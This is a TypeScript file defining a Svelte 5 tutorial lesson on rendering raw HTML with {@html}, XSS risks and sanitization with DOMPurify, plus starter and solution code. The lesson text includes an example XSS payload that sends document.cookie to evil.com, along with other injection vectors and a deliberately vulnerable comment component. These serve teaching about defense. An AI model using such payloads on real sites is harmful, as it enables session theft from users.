import type { Lesson } from '$types/lesson';

export const rawHtmlAndSecurity: Lesson = {
	id: 'svelte-core.advanced-patterns.raw-html-and-security',
	slug: 'raw-html-and-security',
	title: 'Raw HTML with {@html} & Security',
	description:
		'Render raw HTML strings safely using {@html}, understand XSS risks, and learn sanitization patterns.',
	trackId: 'svelte-core',
	moduleId: 'advanced-patterns',
	order: 5,
	estimatedMinutes: 20,
	concepts: ['svelte5.template.html-tag', 'svelte5.security.xss-prevention', 'svelte5.template.render-vs-html'],
	prerequisites: ['svelte5.runes.state', 'svelte5.runes.derived', 'svelte5.components.basic'],

	content: [
		{
			type: 'text',
			content: `# Raw HTML with {@html} & Security

## Why {@html} Exists

By default, Svelte treats all expressions in templates as text. If you write \`{content}\` where \`content\` is \`"<strong>bold</strong>"\`, Svelte renders the literal string including the angle brackets -- the user sees \`<strong>bold</strong>\` as plain text on the page, not **bold** text. This is a critical security feature called output encoding or escaping. It prevents untrusted data from being interpreted as HTML.

But sometimes you genuinely need to render raw HTML. The most common scenarios are:

1. **CMS content** -- A headless CMS returns rich text as HTML. You receive \`"<h2>About Us</h2><p>We build tools...</p>"\` from an API and need to render it as actual DOM elements.

2. **Markdown rendering** -- You convert Markdown to HTML using a library like \`marked\` or \`markdown-it\`. The output is an HTML string that must be injected into the DOM.

3. **SVG from data** -- You generate SVG markup dynamically or receive it from an icon library as strings.

4. **Syntax-highlighted code** -- Libraries like \`highlight.js\` or \`shiki\` produce HTML strings with \`<span>\` elements for colored tokens.

5. **Rich text editors** -- WYSIWYG editors like TipTap or Quill produce HTML output that you need to display.

For all these cases, Svelte provides the \`{@html}\` tag:

\`\`\`svelte
<script lang="ts">
  const htmlContent = '<p>This is <strong>bold</strong> and <em>italic</em> text.</p>';
</script>

{@html htmlContent}
\`\`\`

The \`{@html}\` tag takes a string expression and injects it directly into the DOM as HTML. Svelte does not escape the content -- it is inserted as-is using \`innerHTML\` under the hood. The result is real DOM elements, not text nodes.

## The XSS Danger: NEVER Use {@html} with Unsanitized User Input

This is the most important security lesson in all of Svelte development. The \`{@html}\` tag is a direct injection point for Cross-Site Scripting (XSS) attacks. If you pass user-controlled content to \`{@html}\` without sanitization, an attacker can execute arbitrary JavaScript in your users' browsers.

Here is a concrete attack scenario:

\`\`\`svelte
<script lang="ts">
  // DANGEROUS: user-provided content rendered as raw HTML
  let comment = $state('');
</script>

<input bind:value={comment} placeholder="Write a comment..." />
<div class="preview">
  {@html comment}  <!-- XSS VULNERABILITY -->
</div>
\`\`\`

If a user types the following into the input:

\`\`\`html
<img src="x" onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
\`\`\`

The \`{@html}\` tag injects this as a real \`<img>\` element. The browser tries to load the image from \`"x"\`, fails, and executes the \`onerror\` handler -- which redirects the user to an attacker-controlled server, sending their session cookie in the URL. The attacker now has the user's session.

Other attack vectors include:

- \`<script>alert('XSS')</script>\` -- Note: scripts inserted via \`innerHTML\` do not execute in modern browsers, but this is NOT a reliable defense.
- \`<svg onload="maliciousCode()">\` -- SVG event handlers DO execute.
- \`<a href="javascript:maliciousCode()">Click me</a>\` -- JavaScript URLs execute on click.
- \`<style>body { display: none }</style>\` -- CSS injection can hide the page or exfiltrate data.
- \`<iframe src="https://evil.com/phishing-page"></iframe>\` -- Embed phishing content.

The rule is absolute: **never pass unsanitized user input to {@html}**. If the content comes from a user, a URL parameter, a database field that users can edit, or any other untrusted source, it MUST be sanitized first.`
		},
		{
			type: 'concept-callout',
			content: 'svelte5.security.xss-prevention'
		},
		{
			type: 'text',
			content: `## Sanitizing HTML with DOMPurify

The gold standard for HTML sanitization in JavaScript is DOMPurify. It parses HTML and removes any elements, attributes, or URI schemes that could execute scripts, while preserving safe formatting elements.

\`\`\`bash
npm install dompurify
npm install -D @types/dompurify
\`\`\`

\`\`\`svelte
<script lang="ts">
  import DOMPurify from 'dompurify';

  let userContent = $state('<p>Hello <strong>world</strong></p><img src=x onerror=alert(1)>');

  const sanitized = $derived(DOMPurify.sanitize(userContent));
</script>

<div class="preview">
  {@html sanitized}
</div>
\`\`\`

DOMPurify strips the dangerous \`onerror\` attribute from the \`<img>\` tag. The output is \`<p>Hello <strong>world</strong></p><img src="x">\` -- safe to render.

### Configuring DOMPurify

DOMPurify is highly configurable. You can whitelist specific tags and attributes:

\`\`\`typescript
import DOMPurify from 'dompurify';

// Only allow basic formatting
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class']
});

// Strip everything -- return plain text
const plainText = DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [] });

// Allow data attributes
const withData = DOMPurify.sanitize(dirty, {
  ADD_ATTR: ['data-id', 'data-type']
});
\`\`\`

### SSR Considerations with DOMPurify

DOMPurify relies on the DOM API (\`document.createElement\`, etc.). On the server during SSR, there is no DOM. You have two options:

1. **Use \`isomorphic-dompurify\`** -- A wrapper that uses \`jsdom\` on the server:

\`\`\`bash
npm install isomorphic-dompurify
\`\`\`

\`\`\`typescript
import DOMPurify from 'isomorphic-dompurify';
// Works on both server and client
const clean = DOMPurify.sanitize(dirty);
\`\`\`

2. **Guard with browser check** -- Only sanitize on the client:

\`\`\`typescript
import { browser } from '$app/environment';
import DOMPurify from 'dompurify';

const sanitized = $derived(
  browser ? DOMPurify.sanitize(userContent) : ''
);
\`\`\`

Option 1 is preferred for SEO since the sanitized HTML is included in the server-rendered page.

## Building a Markdown Renderer

A classic use case for \`{@html}\` is rendering Markdown. Here is a complete pattern using the \`marked\` library:

\`\`\`svelte
<script lang="ts">
  import { marked } from 'marked';
  import DOMPurify from 'isomorphic-dompurify';

  let markdown = $state('# Hello World\\n\\nThis is **bold** and *italic*.');

  const html = $derived(DOMPurify.sanitize(marked.parse(markdown) as string));
</script>

<textarea bind:value={markdown} rows="8"></textarea>

<div class="preview">
  {@html html}
</div>
\`\`\`

The pipeline is: user types Markdown -> \`marked.parse()\` converts to HTML -> \`DOMPurify.sanitize()\` strips dangerous elements -> \`{@html}\` renders the safe HTML. Every step is reactive thanks to \`$derived\`.

**Your task:** Build a markdown preview component. Create a split-pane layout with a textarea on the left and the rendered preview on the right. Use the \`marked\` library (already available) to convert markdown to HTML, and DOMPurify to sanitize the output before passing it to \`{@html}\`.`
		},
		{
			type: 'checkpoint',
			content: 'cp-1'
		},
		{
			type: 'text',
			content: `## {@html} Does NOT Create Reactive Bindings

A critical limitation that trips up many developers: content rendered with \`{@html}\` is inert. Svelte does not process the HTML string -- it does not create component instances, bind event handlers, or set up reactive bindings within the injected HTML.

\`\`\`svelte
<script lang="ts">
  let count = $state(0);

  // This DOES NOT work as expected
  const dynamicHtml = $derived(
    \`<button onclick="count++">Count: \${count}</button>\`
  );
</script>

{@html dynamicHtml}
\`\`\`

The button renders visually, but clicking it throws a ReferenceError because \`count\` in the \`onclick\` attribute refers to a global \`count\` variable (which does not exist), not the Svelte component's reactive \`count\` state. Inline event handlers in \`{@html}\` strings are plain HTML event attributes -- they execute in the global scope, completely disconnected from Svelte's reactivity system.

Similarly, Svelte directives do not work inside \`{@html}\`:

\`\`\`svelte
<!-- NONE of these work inside {@html} -->
{@html '<input bind:value={name} />'}
{@html '<div on:click={handler}>'}
{@html '<Component />'}
{@html '<div transition:fade>'}
\`\`\`

The string is injected as raw HTML. Svelte never compiles it, so directives like \`bind:\`, \`on:\`, \`transition:\`, and component references are meaningless.

### When You Need Interactive Injected Content

If you need to add event listeners to \`{@html}\` content, use an \`$effect\` to query the rendered DOM:

\`\`\`svelte
<script lang="ts">
  let container: HTMLDivElement;
  const htmlContent = '<button class="action-btn">Click Me</button>';

  $effect(() => {
    const buttons = container.querySelectorAll('.action-btn');
    const handler = () => console.log('Clicked!');

    buttons.forEach(btn => btn.addEventListener('click', handler));

    return () => {
      buttons.forEach(btn => btn.removeEventListener('click', handler));
    };
  });
</script>

<div bind:this={container}>
  {@html htmlContent}
</div>
\`\`\`

This pattern queries the DOM after \`{@html}\` renders, attaches listeners manually, and cleans them up when the effect re-runs or the component unmounts.

## {@html} vs {@render}

Svelte 5 introduced the \`{@render}\` tag for rendering snippets. It is important to understand the difference:

| Feature | \`{@html string}\` | \`{@render snippet()}\` |
|---|---|---|
| Input | HTML string | Snippet (compiled Svelte template) |
| Reactive bindings | No | Yes |
| Event handlers | No (plain HTML only) | Yes (Svelte event handling) |
| Component support | No | Yes |
| XSS risk | Yes (if unsanitized) | No (compiled at build time) |
| Use case | External HTML (CMS, markdown) | Reusable template fragments |

\`{@render}\` is always preferred when you control the template content. It is type-safe, reactive, and cannot introduce XSS vulnerabilities. Use \`{@html}\` only when you receive HTML as a string from an external source.

**Task:** Add a "source view" toggle to your markdown preview. When toggled on, show the raw HTML output from \`marked\` (as escaped text, NOT rendered) alongside the rendered preview. This demonstrates the difference between \`{@html sanitizedHtml}\` (renders as DOM) and \`{sanitizedHtml}\` (displays as text).`
		},
		{
			type: 'checkpoint',
			content: 'cp-2'
		},
		{
			type: 'xray-prompt',
			content: `A developer writes this component:

\`\`\`svelte
<script lang="ts">
  let comments: string[] = $state([]);
  let newComment = $state('');

  function addComment() {
    comments.push(newComment);
    newComment = '';
  }
</script>

<input bind:value={newComment} />
<button onclick={addComment}>Post</button>

{#each comments as comment}
  <div class="comment">
    {@html comment}
  </div>
{/each}
\`\`\`

Explain every way an attacker could exploit this code. Then rewrite it to be secure, keeping the ability to render basic formatting (bold, italic, links) from user input. What library would you use and how would you configure it?`
		},
		{
			type: 'text',
			content: `## Advanced Patterns with {@html}

### Syntax Highlighting

Rendering syntax-highlighted code is a safe use of \`{@html}\` because the HTML comes from a trusted library, not user input:

\`\`\`svelte
<script lang="ts">
  import hljs from 'highlight.js';

  let code = $state('const greeting = "Hello, Svelte!";');
  let language = $state('typescript');

  const highlighted = $derived(
    hljs.highlight(code, { language }).value
  );
</script>

<pre><code>{@html highlighted}</code></pre>
\`\`\`

The \`highlight.js\` library produces HTML with \`<span>\` elements for syntax tokens. The input (\`code\`) is the raw source code string, and \`highlight.js\` escapes it internally before wrapping tokens in spans. This is safe because the library controls the output format.

### Conditional {@html}

You can use \`{@html}\` inside conditional blocks and each blocks:

\`\`\`svelte
{#if contentType === 'html'}
  {@html sanitizedContent}
{:else}
  <p>{plainTextContent}</p>
{/if}

{#each articles as article}
  <article>
    <h2>{article.title}</h2>
    {@html article.sanitizedBody}
  </article>
{/each}
\`\`\`

### Performance Notes

Every time the expression passed to \`{@html}\` changes, Svelte destroys all DOM nodes inside the injection point and creates new ones from the updated HTML string. This is more expensive than Svelte's normal fine-grained DOM updates. If you have frequently changing HTML content, consider whether a Svelte snippet or component would be more appropriate.

For large HTML documents (like a full blog post), the initial \`{@html}\` render is fast because the browser's HTML parser is highly optimized. But subsequent updates replace the entire HTML block. If only a small part changes, the browser still rebuilds the complete DOM tree for that \`{@html}\` block.

## Summary

The \`{@html}\` tag renders raw HTML strings into the DOM without escaping. It exists for legitimate use cases like CMS content, markdown rendering, SVG injection, and syntax highlighting. The critical rule: never use \`{@html}\` with unsanitized user input. Always sanitize with DOMPurify (or \`isomorphic-dompurify\` for SSR). Remember that \`{@html}\` content is inert -- no Svelte bindings, events, or components work inside it. For interactive template fragments, use \`{@render}\` with snippets instead. When you must add interactivity to \`{@html}\` content, use \`$effect\` with manual DOM queries and event listeners.`
		},
		{
			type: 'concept-callout',
			content: 'svelte5.template.html-tag'
		}
	],

	starterFiles: [
		{
			name: 'App.svelte',
			path: '/App.svelte',
			language: 'svelte',
			content: `<script lang="ts">
  // TODO: Import marked from 'marked'
  // TODO: Import DOMPurify from 'isomorphic-dompurify'

  let markdown = $state(\`# Welcome to the Markdown Preview

## Features

- **Bold text** and *italic text*
- [Links](https://svelte.dev)
- Code: \\\`const x = 42;\\\`

> A blockquote for emphasis.

### Try Editing!

Type some markdown in this editor and see it rendered in real-time.
\`);

  let showSource = $state(false);

  // TODO: Convert markdown to HTML with marked.parse()
  // TODO: Sanitize the HTML with DOMPurify.sanitize()
</script>

<div class="editor-container">
  <div class="pane editor-pane">
    <div class="pane-header">
      <h3>Markdown</h3>
    </div>
    <textarea bind:value={markdown}></textarea>
  </div>

  <div class="pane preview-pane">
    <div class="pane-header">
      <h3>Preview</h3>
      <label>
        <input type="checkbox" bind:checked={showSource} />
        Show HTML source
      </label>
    </div>
    <div class="preview-content">
      <!-- TODO: If showSource is true, display the raw HTML as text -->
      <!-- TODO: If showSource is false, render with {@html} -->
      <p class="placeholder">Rendered preview will appear here</p>
    </div>
  </div>
</div>

<style>
  .editor-container {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
    height: 500px;
    font-family: system-ui, sans-serif;
    padding: 1rem;
  }

  .pane {
    display: flex;
    flex-direction: column;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    overflow: hidden;
  }

  .pane-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.5rem 1rem;
    background: #f8fafc;
    border-bottom: 1px solid #e2e8f0;
  }

  .pane-header h3 {
    margin: 0;
    font-size: 0.9rem;
    color: #475569;
  }

  .pane-header label {
    font-size: 0.8rem;
    color: #64748b;
    display: flex;
    align-items: center;
    gap: 0.25rem;
    cursor: pointer;
  }

  textarea {
    flex: 1;
    padding: 1rem;
    border: none;
    resize: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.875rem;
    line-height: 1.6;
    outline: none;
  }

  .preview-content {
    flex: 1;
    padding: 1rem;
    overflow-y: auto;
    line-height: 1.7;
  }

  .preview-content :global(h1) { font-size: 1.5rem; margin-top: 0; }
  .preview-content :global(h2) { font-size: 1.25rem; color: #334155; }
  .preview-content :global(h3) { font-size: 1.1rem; color: #475569; }
  .preview-content :global(code) {
    background: #f1f5f9;
    padding: 0.15rem 0.4rem;
    border-radius: 4px;
    font-size: 0.85em;
  }
  .preview-content :global(blockquote) {
    border-left: 3px solid #3b82f6;
    margin-left: 0;
    padding-left: 1rem;
    color: #64748b;
  }
  .preview-content :global(a) {
    color: #3b82f6;
    text-decoration: underline;
  }

  .placeholder {
    color: #94a3b8;
    font-style: italic;
  }

  pre.source {
    background: #1e293b;
    color: #e2e8f0;
    padding: 1rem;
    border-radius: 6px;
    font-size: 0.8rem;
    white-space: pre-wrap;
    word-break: break-all;
  }
</style>`
		}
	],

	solutionFiles: [
		{
			name: 'App.svelte',
			path: '/App.svelte',
			language: 'svelte',
			content: `<script lang="ts">
  import { marked } from 'marked';
  import DOMPurify from 'isomorphic-dompurify';

  let markdown = $state(\`# Welcome to the Markdown Preview

## Features

- **Bold text** and *italic text*
- [Links](https://svelte.dev)
- Code: \\\`const x = 42;\\\`

> A blockquote for emphasis.

### Try Editing!

Type some markdown in this editor and see it rendered in real-time.
\`);

  let showSource = $state(false);

  const rawHtml = $derived(marked.parse(markdown) as string);
  const sanitizedHtml = $derived(DOMPurify.sanitize(rawHtml));
</script>

<div class="editor-container">
  <div class="pane editor-pane">
    <div class="pane-header">
      <h3>Markdown</h3>
    </div>
    <textarea bind:value={markdown}></textarea>
  </div>

  <div class="pane preview-pane">
    <div class="pane-header">
      <h3>Preview</h3>
      <label>
        <input type="checkbox" bind:checked={showSource} />
        Show HTML source
      </label>
    </div>
    <div class="preview-content">
      {#if showSource}
        <pre class="source">{sanitizedHtml}</pre>
      {:else}
        {@html sanitizedHtml}
      {/if}
    </div>
  </div>
</div>

<style>
  .editor-container {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
    height: 500px;
    font-family: system-ui, sans-serif;
    padding: 1rem;
  }

  .pane {
    display: flex;
    flex-direction: column;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    overflow: hidden;
  }

  .pane-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.5rem 1rem;
    background: #f8fafc;
    border-bottom: 1px solid #e2e8f0;
  }

  .pane-header h3 {
    margin: 0;
    font-size: 0.9rem;
    color: #475569;
  }

  .pane-header label {
    font-size: 0.8rem;
    color: #64748b;
    display: flex;
    align-items: center;
    gap: 0.25rem;
    cursor: pointer;
  }

  textarea {
    flex: 1;
    padding: 1rem;
    border: none;
    resize: none;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.875rem;
    line-height: 1.6;
    outline: none;
  }

  .preview-content {
    flex: 1;
    padding: 1rem;
    overflow-y: auto;
    line-height: 1.7;
  }

  .preview-content :global(h1) { font-size: 1.5rem; margin-top: 0; }
  .preview-content :global(h2) { font-size: 1.25rem; color: #334155; }
  .preview-content :global(h3) { font-size: 1.1rem; color: #475569; }
  .preview-content :global(code) {
    background: #f1f5f9;
    padding: 0.15rem 0.4rem;
    border-radius: 4px;
    font-size: 0.85em;
  }
  .preview-content :global(blockquote) {
    border-left: 3px solid #3b82f6;
    margin-left: 0;
    padding-left: 1rem;
    color: #64748b;
  }
  .preview-content :global(a) {
    color: #3b82f6;
    text-decoration: underline;
  }

  .placeholder {
    color: #94a3b8;
    font-style: italic;
  }

  pre.source {
    background: #1e293b;
    color: #e2e8f0;
    padding: 1rem;
    border-radius: 6px;
    font-size: 0.8rem;
    white-space: pre-wrap;
    word-break: break-all;
  }
</style>`
		}
	],

	checkpoints: [
		{
			id: 'cp-1',
			description: 'Build a markdown preview with marked and DOMPurify sanitization',
			validation: {
				type: 'code-pattern',
				config: {
					patterns: [
						{ type: 'contains', value: '{@html' },
						{ type: 'contains', value: 'DOMPurify' },
						{ type: 'contains', value: 'marked' }
					]
				}
			},
			hints: [
				'Import `marked` from `marked` and `DOMPurify` from `isomorphic-dompurify`. Use `marked.parse(markdown)` to convert the markdown string to HTML.',
				'Create a `$derived` for the sanitized HTML: `const sanitizedHtml = $derived(DOMPurify.sanitize(marked.parse(markdown) as string))`. The `as string` cast is needed because `marked.parse` can return a `Promise`.',
				'Render with `{@html sanitizedHtml}` in the preview pane. The `$derived` ensures the preview updates reactively whenever the markdown text changes.'
			],
			conceptsTested: ['svelte5.template.html-tag', 'svelte5.security.xss-prevention']
		},
		{
			id: 'cp-2',
			description: 'Add a source view toggle showing raw HTML as escaped text vs rendered HTML',
			validation: {
				type: 'code-pattern',
				config: {
					patterns: [
						{ type: 'contains', value: 'showSource' },
						{ type: 'contains', value: '{@html' },
						{ type: 'contains', value: '{#if' }
					]
				}
			},
			hints: [
				'Create a `let showSource = $state(false)` and bind it to a checkbox: `<input type="checkbox" bind:checked={showSource} />`.',
				'Use an `{#if showSource}` block. In the truthy branch, show `<pre class="source">{sanitizedHtml}</pre>` (note: no `@html`, so it displays as escaped text). In the else branch, show `{@html sanitizedHtml}`.',
				'This demonstrates the key difference: `{expression}` escapes HTML entities and shows the raw markup as text, while `{@html expression}` renders it as actual DOM elements.'
			],
			conceptsTested: ['svelte5.template.html-tag', 'svelte5.template.render-vs-html']
		}
	]
};
